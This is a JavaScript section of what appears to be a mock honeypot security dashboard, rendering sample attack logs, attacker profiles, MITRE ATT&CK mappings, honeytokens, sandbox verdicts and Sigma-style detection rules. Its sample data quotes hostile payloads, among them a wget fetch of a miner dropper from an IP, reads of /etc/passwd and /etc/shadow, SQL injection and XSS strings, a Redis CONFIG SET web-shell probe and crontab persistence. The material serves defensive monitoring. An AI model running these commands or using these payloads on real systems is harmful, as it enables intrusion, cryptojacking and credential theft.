+const svcs=[['SSH',62,'var(--c1)'],['HTTP/S',21,'var(--c2)'],['MySQL',8,'var(--c5)'],['Redis',5,'var(--c4)'],['FTP',3,'var(--c6)'],['SMTP',1,'var(--c3)']];
+const sb=document.getElementById('svcbars');
+svcs.forEach(([l,p,c])=>{sb.innerHTML+=`<div class="br"><span class="bl">${l}</span><div class="bt"><div class="bf" style="width:${p}%;background:${c}"></div></div><span class="bv">${p}%</span></div>`;});
+const cmds=[['wget http',34,'var(--c1)'],['cat /etc/passwd',22,'var(--c2)'],['uname -a',18,'var(--c5)'],['id',14,'var(--c4)'],['ps aux',7,'var(--c6)'],['chmod +x',5,'var(--c3)']];
+const cb=document.getElementById('cmdbars');
+cmds.forEach(([l,p,c])=>{cb.innerHTML+=`<div class="br"><span class="bl" style="width:80px;font-size:7px">${l}</span><div class="bt"><div class="bf" style="width:${p*2}%;background:${c}"></div></div><span class="bv">${p}%</span></div>`;});
+
+// ── LIVE FEED ──
+const evts=[
+  ['SSH','5.188.206.14','wget miner.sh dropper download','rc'],
+  ['HTTP','45.83.64.1','SQL injection — UNION SELECT','rh'],
+  ['Redis','91.240.118.3','CONFIG SET dir /var/www','rc'],
+  ['MySQL','103.22.18.9','root:admin connect attempt','rh'],
+  ['SSH','194.165.16.18','Brute force — 48 attempts','rh'],
+  ['HTTP','185.220.101.3','XSS probe — <script> inject','rm'],
+  ['FTP','193.142.58.1','Directory traversal ../../etc','rm'],
+  ['SMTP','45.95.168.1','Open relay probe EHLO','rl'],
+];
+function makeFeed(id,items,max){
+  const el=document.getElementById(id);
+  const bc={'SSH':'ss','HTTP':'sh','Redis':'so','MySQL':'sm','FTP':'sy','SMTP':'sr','Telnet':'sr'};
+  items.slice(0,max).forEach(([svc,ip,evt,risk])=>{
+    el.innerHTML+=`<div class="fi"><span class="sb ${bc[svc]||'ss'}">${svc}</span><span class="fip">${ip}</span><span class="fe">${evt}</span><span class="rp ${risk}">${risk==='rc'?'CRIT':risk==='rh'?'HIGH':risk==='rm'?'MED':'LOW'}</span></div>`;
+  });
+}
+makeFeed('feed0',evts,6);
+
+// ── LOG FEED ──
+const logs=[
+  ['14:31:22','SSH','5.188.206.14','cmd_exec','wget http://194.165.16.18/miner.sh','T1105'],
+  ['14:31:18','SSH','5.188.206.14','login_success','root/toor','T1078'],
+  ['14:30:55','Redis','91.240.118.3','exploit_probe','CONFIG SET dir /var/www/html','T1505'],
+  ['14:30:41','HTTP','45.83.64.1','sqli_probe',"admin' OR 1=1--",'T1190'],
+  ['14:30:28','MySQL','103.22.18.9','connect_attempt','root/admin123','T1110'],
+  ['14:30:12','SSH','194.165.16.18','brute_force','48 attempts root/pi/admin','T1110.001'],
+  ['14:29:58','HTTP','185.220.101.3','xss_probe','<script>alert(1)</script>','T1059.007'],
+  ['14:29:44','FTP','193.142.58.1','dir_traversal','../../etc/shadow','T1083'],
+  ['14:29:30','SMTP','45.95.168.1','open_relay','EHLO attacker.com RCPT root@','T1566'],
+  ['14:29:14','SSH','5.188.206.14','cmd_exec','cat /etc/passwd','T1003'],
+];
+const lf=document.getElementById('logfeed');
+const bc2={'SSH':'ss','HTTP':'sh','Redis':'so','MySQL':'sm','FTP':'sy','SMTP':'sr'};
+logs.forEach(([ts,svc,ip,evt,payload,ttp])=>{
+  lf.innerHTML+=`<div style="padding:2px 0;border-bottom:1px solid rgba(255,255,255,.03)"><span style="color:var(--tm)">${ts}</span> <span class="sb ${bc2[svc]||'ss'}">${svc}</span> <span style="color:var(--c1)">${ip}</span> <span style="color:var(--t)">${evt}</span> <span style="color:var(--c2)">${payload.substring(0,38)}</span> <span style="background:rgba(255,140,0,.15);color:var(--c4);padding:1px 4px;border-radius:3px;font-size:7px">${ttp}</span></div>`;
+});
+
+// ── ATTACKER CARDS ──
+const attackers=[
+  {ip:'5.188.206.14',flag:'🇷🇺',country:'Russia',isp:'AS206728 MivoCloud',hits:847,cmds:87,sessions:12,risk:'',tactics:['Execution','Persistence','TA'],cmds2:['wget','chmod +x','crontab']},
+  {ip:'91.240.118.3',flag:'🇨🇳',country:'China',isp:'AS4134 ChinaNet',hits:312,cmds:31,sessions:5,risk:'',tactics:['InitAccess','DefEvasion'],cmds2:['CONFIG SET','SLAVEOF','INFO']},
+  {ip:'45.83.64.1',flag:'🇳🇱',country:'Netherlands',isp:'AS60558 Serverius',hits:198,cmds:22,sessions:7,risk:'h',tactics:['InitAccess','Discovery'],cmds2:["OR 1=1",'UNION','--dump']},
+  {ip:'194.165.16.18',flag:'🇱🇹',country:'Lithuania',isp:'AS206216 Hostbaltic',hits:134,cmds:14,sessions:4,risk:'m',tactics:['CredAccess'],cmds2:['root:pi','admin:1234','user:user']},
+];
+const ag=document.getElementById('acGrid');
+attackers.forEach(a=>{
+  ag.innerHTML+=`<div class="ac ${a.risk}" onclick="sendPrompt('Investigate attacker IP ${a.ip} — show me full session replay and threat assessment')">
+    <div class="ac-ip">${a.ip}</div>
+    <div class="ac-meta">${a.flag} ${a.country} · ${a.isp}</div>
+    <div class="tags">${a.tactics.map(t=>`<span class="tag tag-t">${t}</span>`).join('')}</div>
+    <div class="tags">${a.cmds2.map(c=>`<span class="tag tag-c">${c}</span>`).join('')}</div>
+    <div class="ac-stats">
+      <div class="ac-stat"><div class="ac-sv" style="color:var(--c3)">${a.hits}</div><div class="ac-sl">hits</div></div>
+      <div class="ac-stat"><div class="ac-sv" style="color:var(--c1)">${a.cmds}</div><div class="ac-sl">cmds</div></div>
+      <div class="ac-stat"><div class="ac-sv" style="color:var(--c2)">${a.sessions}</div><div class="ac-sl">sessions</div></div>
+    </div>
+  </div>`;
+});
+
+// ── ATT&CK MATRIX ──
+const tactics=[
+  {n:'Recon',t:[{i:'T1595',h:'m3'},{i:'T1589',h:'m2'},{i:'T1590',h:'m1'},{i:'T1591',h:'m0'}]},
+  {n:'Init.Access',t:[{i:'T1190',h:'m3'},{i:'T1078',h:'m2'},{i:'T1133',h:'m1'},{i:'T1566',h:'m0'}]},
+  {n:'Execution',t:[{i:'T1059',h:'m3'},{i:'T1203',h:'m1'},{i:'T1106',h:'m0'},{i:'T1053',h:'m1'}]},
+  {n:'Persistence',t:[{i:'T1505',h:'m2'},{i:'T1136',h:'m1'},{i:'T1078',h:'m3'},{i:'T1543',h:'m0'}]},
+  {n:'Cred Access',t:[{i:'T1110',h:'m3'},{i:'T1003',h:'m2'},{i:'T1552',h:'m2'},{i:'T1555',h:'m0'}]},
+  {n:'Discovery',t:[{i:'T1083',h:'m2'},{i:'T1057',h:'m1'},{i:'T1046',h:'m3'},{i:'T1082',h:'m2'}]},
+  {n:'Exfiltration',t:[{i:'T1041',h:'m1'},{i:'T1048',h:'m0'},{i:'T1052',h:'m0'},{i:'T1029',h:'m1'}]},
+];
+const mx=document.getElementById('mxGrid');
+tactics.forEach(tac=>{
+  let c=`<div class="mcol"><div class="mh">${tac.n}</div>`;
+  tac.t.forEach(tc=>{c+=`<div class="mc ${tc.h}" onclick="sendPrompt('Show all honeypot events matching MITRE ATT&CK technique ${tc.i}')">${tc.i}</div>`;});
+  c+=`</div>`;mx.innerHTML+=c;
+});
+const toptech=document.getElementById('toptech');
+[['T1110 Brute Force',42,'var(--c3)'],['T1190 Exploit Public',28,'var(--c4)'],['T1059 Cmd Exec',21,'var(--c5)'],['T1078 Valid Accounts',17,'var(--c1)'],['T1505 Server Software',12,'var(--c2)']].forEach(([l,p,c])=>{
+  toptech.innerHTML+=`<div class="br"><span class="bl" style="width:90px;font-size:7px">${l}</span><div class="bt"><div class="bf" style="width:${p*2}%;background:${c}"></div></div><span class="bv">${p}</span></div>`;
+});
+const tactdist=document.getElementById('tactdist');
+[['Recon',8,'var(--c1)'],['Init. Access',31,'var(--c3)'],['Execution',22,'var(--c4)'],['Persistence',15,'var(--c5)'],['Cred Access',24,'var(--c2)']].forEach(([l,p,c])=>{
+  tactdist.innerHTML+=`<div class="br"><span class="bl" style="width:70px;font-size:7px">${l}</span><div class="bt"><div class="bf" style="width:${p*2}%;background:${c}"></div></div><span class="bv">${p}%</span></div>`;
+});
+
+// ── DETECTION CARDS ──
+const dets=[
+  {name:'SSH brute-force credential spray',detail:'48+ login attempts · T1110.001 · source: 194.165.16.18',cnt:48,sev:'var(--c3)',playbook:'Block source IP · rotate fake credentials · alert Slack'},
+  {name:'Redis CONFIG SET exploit probe',detail:'Attempt to set web shell via DBFILENAME · T1505',cnt:12,sev:'var(--c3)',playbook:'Isolate session · capture PCAP · sandbox payload'},
+  {name:'Malware dropper via wget',detail:'wget http://194.165.16.18/miner.sh · T1105 · SSH session',cnt:7,sev:'var(--c3)',playbook:'Submit to sandbox · extract C2 IOC · update blocklist'},
+  {name:'SQL injection — UNION SELECT',detail:'HTTP /admin/login.php · parameter: id · T1190',cnt:31,sev:'var(--c4)',playbook:'Log payload · check WAF signature · add Sigma rule'},
+  {name:'Directory traversal FTP',detail:'../../etc/shadow · T1083 · likely credential harvesting',cnt:5,sev:'var(--c6)',playbook:'Log path · update fake /etc/shadow decoy'},
+];
+const dl=document.getElementById('detList');
+dets.forEach(d=>{
+  dl.innerHTML+=`<div class="det-card"><div class="det-sev" style="background:${d.sev}"></div><div class="det-body"><div class="det-name">${d.name}</div><div class="det-detail">${d.detail}</div><div style="font-size:7px;color:var(--tm);margin-top:3px;padding:3px 6px;background:var(--bg2);border-radius:3px">Playbook: ${d.playbook}</div></div><div style="text-align:right"><div class="det-count">${d.cnt}</div><div class="det-label">events</div></div></div>`;
+});
+
+// ── HONEYTOKENS ──
+const tokens=[
+  {n:'AKIAIOSFODNN7FAKE',t:'AWS IAM key',s:'ng',l:'31 min ago'},
+  {n:'root:$6$fakesalt$hashXXXXX',t:'/etc/shadow entry',s:'ng',l:'2h 14m ago'},
+  {n:'mysql://root:fakepass@db/prod',t:'DB connection str',s:'ok',l:'Never'},
+  {n:'id_rsa — fake RSA 4096 key',t:'SSH private key',s:'ok',l:'Never'},
+  {n:'api_key=hnytkn_v3_8xFAKE2k',t:'REST API key',s:'ok',l:'Never'},
+  {n:'Bearer eyJFAKEtokenXXX',t:'JWT bearer token',s:'ok',l:'Never'},
+  {n:'SHODAN_KEY=FAKEAPIKEYRIO6IX',t:'Shodan API key',s:'ok',l:'Never'},
+  {n:'/etc/passwd — lure file read',t:'File read bait',s:'ok',l:'Never'},
+];
+const tl2=document.getElementById('tokenList');
+tokens.forEach(t=>{
+  tl2.innerHTML+=`<div class="tk" onclick="sendPrompt('Tell me about honeytoken ${t.t} and how to respond to a trigger event')"><div class="tkdot ${t.s}"></div><div class="tkname">${t.n}</div><div class="tktype">${t.t}</div><div class="tklast ${t.s}">${t.s==='ng'?'⚡ '+t.l:'–'}</div></div>`;
+});
+const tokbars=document.getElementById('tokbars');
+[['AWS keys',2,'var(--c3)'],['Credentials',2,'var(--c4)'],['API keys',2,'var(--c1)'],['File baits',2,'var(--c2)']].forEach(([l,p,c])=>{
+  tokbars.innerHTML+=`<div class="br"><span class="bl">${l}</span><div class="bt"><div class="bf" style="width:${p*25}%;background:${c}"></div></div><span class="bv">${p}</span></div>`;
+});
+
+// ── PCAP ──
+const pcapSess=document.getElementById('pcapSessions');
+[
+  {id:'SSH_5188_1431',size:'48 KB',pkts:312,status:'ng'},
+  {id:'HTTP_4583_1430',size:'12 KB',pkts:89,status:'rh'},
+  {id:'Redis_9124_1430',size:'8 KB',pkts:54,status:'ng'},
+].forEach(s=>{
+  pcapSess.innerHTML+=`<div style="display:flex;align-items:center;gap:6px;padding:5px 0;border-bottom:1px solid rgba(255,255,255,.04);font-size:8px;cursor:pointer" onclick="sendPrompt('Analyze PCAP session ${s.id} for C2 communications and malware indicators')"><span style="color:var(--c1)">${s.id}</span><span style="margin-left:auto;color:var(--tm)">${s.pkts} pkts · ${s.size}</span><span class="rp ${s.status==='ng'?'rc':'rh'}">${s.status==='ng'?'CRIT':'HIGH'}</span></div>`;
+});
+const pcapRows=document.getElementById('pcapRows');
+[
+  [1,'TCP','5.188.206.14:54231','195.0.0.1:22','SSH Client Hello',240],
+  [2,'TCP','195.0.0.1:22','5.188.206.14:54231','SSH Server Banner',480],
+  [3,'TCP','5.188.206.14:54231','195.0.0.1:22','SSH Auth userauth-request',380],
+  [4,'TCP','5.188.206.14:54231','195.0.0.1:22','SSH exec: wget miner.sh',892],
+  [5,'HTTP','5.188.206.14:54232','195.0.0.1:80','GET /miner.sh HTTP/1.1',1240],
+].forEach(([n,proto,src,dst,info,len])=>{
+  const pc={'TCP':'pp-tcp','UDP':'pp-udp','HTTP':'pp-http'}[proto];
+  pcapRows.innerHTML+=`<div class="pcap-row"><span class="pcap-num">${n}</span><span class="pcap-proto ${pc}">${proto}</span><span class="pcap-src">${src}</span><span class="pcap-dst">${dst}</span><span class="pcap-info">${info}</span><span class="pcap-len">${len}B</span></div>`;
+});
+const fpRows=document.getElementById('fpRows');
+[
+  ['JA3','SSH session 5.188.206.14','a0e9f5d64349fb13191bc781f81f42e1','Masscan / custom exploit tool'],
+  ['HASSH','SSH client fingerprint','ec7378c1a92f5a8dde7e8b7a1ddf33d1','Paramiko Python SSH library'],
+  ['JA3S','TLS server response','afa8da9cbc4f8b50679af09ee7b35bfd','OpenSSH_8.4p1'],
+].forEach(([type,desc,hash,match])=>{
+  fpRows.innerHTML+=`<div style="display:flex;gap:8px;padding:5px 0;border-bottom:1px solid rgba(255,255,255,.04);font-size:8px"><span style="color:var(--c4);width:36px;flex-shrink:0">${type}</span><span style="color:var(--tm);width:150px;flex-shrink:0">${desc}</span><span style="color:var(--c1);font-family:'Courier New';flex:1">${hash}</span><span style="color:var(--tm)">${match}</span></div>`;
+});
+
+// ── SANDBOX ──
+const sbs=[
+  {name:'miner.sh — cryptominer dropper',hash:'sha256:3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d',verdict:'sbv-mal',tags:['XMRig miner','cron persistence','C2: 194.165.16.18:4444','Monero mining pool']},
+  {name:'rootkit.tar.gz — suspected rootkit',hash:'sha256:9f8e7d6c5b4a3928f7e6d5c4b3a29180',verdict:'sbv-mal',tags:['LD_PRELOAD hook','proc hiding','network hide','kernel module']},
+  {name:'scan.py — port scanner',hash:'sha256:1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e',verdict:'sbv-sus',tags:['masscan wrapper','botnet recruit','SYN scan','banner grab']},
+];
+const sl=document.getElementById('sbList');
+sbs.forEach(s=>{
+  sl.innerHTML+=`<div class="sb-result" onclick="sendPrompt('Analyze malware sample ${s.name} from my honeypot — give me full IOC report')"><div class="sb-hash">${s.hash}</div><div class="sb-name">${s.name}</div><div class="sb-verdict ${s.verdict}">${s.verdict.includes('mal')?'⚠ MALICIOUS':s.verdict.includes('sus')?'⚡ SUSPICIOUS':'✓ CLEAN'}</div><div class="sb-tags">${s.tags.map(t=>`<span class="sb-tag">${t}</span>`).join('')}</div></div>`;
+});
+
+// ── AI ANALYST ──
+const aiMsgs=document.getElementById('aiMsgs');
+[
+  {title:'Session 5.188.206.14 — APT-like behavior detected',body:'Attacker exhibits multi-stage persistence strategy: initial brute-force credential spray (T1110), followed by dropper download (T1105), then crontab modification for persistence (T1053). Typing cadence analysis suggests automated tooling with human oversight. Cluster match: Eastern European botnet-for-hire group.',tags:['High confidence','LSTM match 94%','12 sessions','APT-like']},
+  {title:'Redis 91.240.118.3 — worm propagation attempt',body:'CONFIG SET attack pattern matches known Redis worm TTPs. After setting web shell path, attacker attempts SLAVEOF replication to spread to other Redis instances. IP seen on 847 other honeypots (GreyNoise data). Likely automated scanning campaign.',tags:['Known IOC','GreyNoise: Malicious','Worm TTP','Auto-block triggered']},
+].forEach(m=>{
+  aiMsgs.innerHTML+=`<div class="ai-msg"><div class="ai-hdr"><i class="ti ti-brain"></i>${m.title}</div><div class="ai-body">${m.body}</div><div class="ai-tags">${m.tags.map(t=>`<span class="ai-tag">${t}</span>`).join('')}</div></div>`;
+});
+const ts=document.getElementById('threatScores');
+[['5.188.206.14',92,'var(--c3)'],['91.240.118.3',87,'var(--c3)'],['45.83.64.1',64,'var(--c4)'],['194.165.16.18',48,'var(--c6)']].forEach(([ip,score,c])=>{
+  ts.innerHTML+=`<div class="threat-score"><div class="score-ring" style="border-color:${c};color:${c}">${score}</div><div class="score-info"><div class="score-label">Threat actor risk score</div><div class="score-val">${ip}</div></div></div>`;
+});
+
+// ── ALERTS ──
+const als=[
+  {sev:'c',icon:'⬇',title:'Malware dropper wget — miner.sh captured',det:'5.188.206.14 · SSH · T1105 · sha256:3a4b5c…',tags:['Auto-sandboxed','Slack sent','IOC extracted'],time:'2 min ago'},
+  {sev:'c',icon:'🔑',title:'Honeytoken triggered — AWS key used externally',det:'AKIAIOSFODNN7FAKE · GetCallerIdentity · us-east-1',tags:['Canary callback','Exfil confirmed'],time:'31 min ago'},
+  {sev:'c',icon:'⚡',title:'Redis CONFIG SET exploit · web shell attempt',det:'91.240.118.3 · T1505 · auto-blocked after 3 attempts',tags:['Auto-blocked','GreyNoise: malicious'],time:'5 min ago'},
+  {sev:'h',icon:'🔐',title:'SSH successful authentication to honeypot',det:'194.165.16.18 · root:toor · interactive session started',tags:['Session recorded','PCAP active'],time:'9 min ago'},
+  {sev:'h',icon:'💉',title:'SQL injection — 31 probes detected',det:'45.83.64.1 · /admin/login.php · T1190',tags:['Sigma rule generated'],time:'14 min ago'},
+  {sev:'m',icon:'📡',title:'High-rate port scanner — 230 req/min',det:'194.165.16.18 · UA: Masscan 1.3 · JA3 matched',tags:['Scanner fingerprint','Rate limited'],time:'22 min ago'},
+];
+const alEl=document.getElementById('alertList');
+als.forEach(a=>{
+  alEl.innerHTML+=`<div class="al ${a.sev}"><div class="al-icon">${a.icon}</div><div class="al-body"><div class="al-title">${a.title}</div><div class="al-det">${a.det}</div><div class="al-meta">${a.tags.map(t=>`<span class="al-tag">${t}</span>`).join('')}</div></div><div class="al-time">${a.time}</div></div>`;
+});
+
+// ── THREAT INTEL ──
+const sigmaList=document.getElementById('sigmaList');
+[
+  {title:'Redis CONFIG SET exploit',sev:'critical',logic:"service: redis AND cmd CONTAINS 'CONFIG SET dir'"},
+  {title:'SSH malware dropper wget',sev:'high',logic:"service: ssh AND cmd CONTAINS 'wget' AND cmd CONTAINS 'http'"},
+  {title:'SQL injection UNION SELECT',sev:'high',logic:"service: http AND payload CONTAINS 'UNION SELECT'"},
+].forEach(r=>{
+  sigmaList.innerHTML+=`<div class="sigma-rule" onclick="sendPrompt('Export Sigma rule for ${r.title} detection to use in my SIEM')"><div class="sigma-hdr">${r.title} <span style="font-size:7px;color:var(--c4)">[${r.sev}]</span></div><div class="sigma-body">${r.logic}</div></div>`;
+});
+const iocList=document.getElementById('iocList');
+[
+  ['IP','5.188.206.14','MivoCloud Russia · AbuseIPDB 98%'],
+  ['IP','91.240.118.3','ChinaNet · GreyNoise malicious'],
+  ['Hash','sha256:3a4b5c…','miner.sh · XMRig cryptominer'],
+  ['URL','http://194.165.16.18/miner.sh','C2 dropper URL'],
+  ['Hash','sha256:9f8e7d…','rootkit.tar.gz · LD_PRELOAD hook'],
+].forEach(([type,val,ctx])=>{
+  iocList.innerHTML+=`<div style="display:flex;gap:6px;padding:5px 0;border-bottom:1px solid rgba(255,255,255,.04);font-size:8px"><span style="color:var(--c4);width:30px;flex-shrink:0">${type}</span><span style="color:var(--c1);flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${val}</span><span style="color:var(--tm)">${ctx}</span></div>`;
+});
+
+// ── KILL CHAIN TIMELINE ──
+const tlItems=document.getElementById('tlItems');
+const stages=[
+  {color:'var(--tm)',time:'14:28:00',title:'Recon — port scan T1046',detail:'Masscan sweep · 6379 22 3306 detected'},
+  {color:'var(--c6)',time:'14:28:45',title:'Credential access T1110.001',detail:'SSH brute force · 48 attempts · root:toor success'},
+  {color:'var(--c4)',time:'14:29:58',title:'Initial access T1078',detail:'SSH login root · interactive shell opened'},
+  {color:'var(--c4)',time:'14:30:22',title:'Discovery T1082 T1057 T1083',detail:'uname -a · ps aux · cat /etc/passwd'},
+  {color:'var(--c3)',time:'14:31:05',title:'Execution T1059 T1105',detail:'wget miner.sh · chmod +x · ./miner.sh'},
+  {color:'var(--c3)',time:'14:31:44',title:'Persistence T1053',detail:'crontab -e · @reboot /tmp/miner.sh'},
+  {color:'var(--c5)',time:'14:32:10',title:'Exfiltration T1041',detail:'Honeytoken AWS key found and used externally'},
+];
+stages.forEach((s,i)=>{
+  tlItems.innerHTML+=`<div class="tl-item"><div class="tl-dot" style="background:${s.color}"></div>${i<stages.length-1?'<div class="tl-line"></div>':''}<div class="tl-body"><div class="tl-time">${s.time}</div><div class="tl-title" style="color:${s.color}">${s.title}</div><div class="tl-detail">${s.detail}</div></div></div>`;
+});
+
+// ── MAP CANVAS (overview) ──
+function drawMap(canvasId,h){
+  const c=document.getElementById(canvasId);
+  if(!c) return;
+  const W=c.offsetWidth||400;
+  c.width=W;c.height=h;
+  const ctx=c.getContext('2d');
+  ctx.fillStyle='#0b1221';ctx.fillRect(0,0,W,h);
+  function ll(lat,lon){return{x:(lon+180)/360*W,y:(90-lat)/180*h};}
+  const dots=[[71,25],[65,-18],[58,-7],[51,-10],[48,2],[44,12],[38,22],[36,-5],[25,-80],[40,-74],[35,-117],[32,-117],[20,-87],[5,-75],[-5,-35],[-15,-47],[-34,-58],[-54,-68],[52,13],[48,16],[55,37],[62,28],[67,15],[70,25],[35,55],[25,55],[15,44],[0,45],[-15,35],[-25,32],[-25,45],[2,10],[5,1],[15,2],[22,88],[28,77],[38,140],[35,135],[22,114],[1,104],[-8,115],[-26,153],[36,128],[51,128],[40,127],[55,65],[63,143],[68,170]];
+  ctx.fillStyle='rgba(255,255,255,0.07)';
+  dots.forEach(([lat,lon])=>{const p=ll(lat,lon);ctx.beginPath();ctx.arc(p.x,p.y,1.5,0,Math.PI*2);ctx.fill();});
+  const srv=ll(7,81);
+  ctx.fillStyle='#00ff9d';ctx.beginPath();ctx.arc(srv.x,srv.y,5,0,Math.PI*2);ctx.fill();
+  [8,16].forEach(r=>{ctx.strokeStyle='rgba(0,255,157,0.25)';ctx.lineWidth=0.5;ctx.beginPath();ctx.arc(srv.x,srv.y,r,0,Math.PI*2);ctx.stroke();});
+  const srcs=[[55.75,37.62,'#ff2d55'],[39.9,116.4,'#ff2d55'],[52.37,4.9,'#ff8c00'],[45.83,12.3,'#a855f7'],[60,10.8,'#ffd60a'],[51.5,-0.12,'#00e5ff'],[-33.87,151.2,'#a855f7'],[35.7,139.7,'#ffd60a'],[40.7,-74,'#00ff9d'],[19.08,72.88,'#a855f7']];
+  srcs.forEach(([lat,lon,col])=>{
+    const src=ll(lat,lon);
+    const mx=(src.x+srv.x)/2,my=(src.y+srv.y)/2-(h*0.15);
+    ctx.strokeStyle=col;ctx.lineWidth=0.8;ctx.globalAlpha=0.55;ctx.beginPath();
+    ctx.moveTo(src.x,src.y);ctx.quadraticCurveTo(mx,my,srv.x,srv.y);ctx.stroke();
+    ctx.globalAlpha=1;ctx.fillStyle=col;ctx.beginPath();ctx.arc(src.x,src.y,2.5,0,Math.PI*2);ctx.fill();
+  });
+}
+drawMap('mapC',120);
+
+// ── BIG MAP (deferred) ──
+function drawBigMap(){drawMap('bigMapC',220);}
+
+// ── SPARKLINES ──
+function drawSpark(id,vals,col){
+  const el=document.getElementById(id);
+  if(!el) return;
+  const mx=Math.max(...vals);
+  vals.forEach(v=>{
+    const h=Math.max(4,Math.round((v/mx)*38));
+    el.innerHTML+=`<div class="spk-bar" style="height:${h}px;background:${col||'var(--c1)'}"></div>`;
+  });
+}
+drawSpark('spark',[12,34,28,55,89,120,76,102,145,180,134,98],'var(--c3)');
+drawSpark('spark2',[8,22,41,67,88,105,94,130,156,189,143,112],'var(--c1)');
+
+// ── COUNTRY / ASN (map page) ──
+const ctry=document.getElementById('ctry');
+[['🇷🇺 Russia',38,'var(--c3)'],['🇨🇳 China',22,'var(--c1)'],['🇳🇱 Netherlands',14,'var(--c5)'],['🇺🇸 United States',10,'var(--c2)'],['🇱🇹 Lithuania',8,'var(--c4)']].forEach(([l,p,c])=>{
+  ctry.innerHTML+=`<div class="br"><span class="bl" style="width:90px">${l}</span><div class="bt"><div class="bf" style="width:${p*2}%;background:${c}"></div></div><span class="bv">${p}%</span></div>`;
+});
+const asns=document.getElementById('asns');
+[['AS206728 MivoCloud',34,'var(--c3)'],['AS4134 ChinaNet',22,'var(--c1)'],['AS60558 Serverius',14,'var(--c5)'],['AS206216 Hostbaltic',8,'var(--c4)']].forEach(([l,p,c])=>{
+  asns.innerHTML+=`<div class="br"><span class="bl" style="width:100px;font-size:7px">${l}</span><div class="bt"><div class="bf" style="width:${p*2}%;background:${c}"></div></div><span class="bv">${p}%</span></div>`;
+});
+
+// ── NETWORK GRAPH ──
+function drawNet(){
+  const c=document.getElementById('netC');
+  if(!c) return;
+  const W=c.offsetWidth||300;
+  c.width=W;c.height=180;
+  const ctx=c.getContext('2d');
+  ctx.fillStyle='#0b1221';ctx.fillRect(0,0,W,180);
+  const nodes=[
+    {x:W/2,y:90,r:8,col:'#00ff9d',label:'Honeypot'},
+    {x:60,y:40,r:6,col:'#ff2d55',label:'5.188.206'},
+    {x:60,y:140,r:5,col:'#ff2d55',label:'91.240.118'},
+    {x:W-60,y:40,r:5,col:'#ff8c00',label:'45.83.64'},
+    {x:W-60,y:140,r:5,col:'#ffd60a',label:'194.165.16'},
+    {x:W/2-60,y:20,r:4,col:'#a855f7',label:'185.220.101'},
+    {x:W/2+60,y:160,r:4,col:'#a855f7',label:'193.142.58'},
+  ];
+  const edges=[[0,1],[0,2],[0,3],[0,4],[0,5],[0,6],[1,5],[2,3]];
+  edges.forEach(([a,b])=>{
+    ctx.strokeStyle='rgba(0,229,255,0.2)';ctx.lineWidth=0.8;ctx.setLineDash([3,3]);
+    ctx.beginPath();ctx.moveTo(nodes[a].x,nodes[a].y);ctx.lineTo(nodes[b].x,nodes[b].y);ctx.stroke();
+    ctx.setLineDash([]);
+  });
+  nodes.forEach(n=>{
+    ctx.fillStyle=n.col;ctx.beginPath();ctx.arc(n.x,n.y,n.r,0,Math.PI*2);ctx.fill();
+    ctx.fillStyle='rgba(255,255,255,0.6)';ctx.font='7px Courier New';ctx.textAlign='center';
+    ctx.fillText(n.label,n.x,n.y+n.r+9);
+  });
+}
+</script>
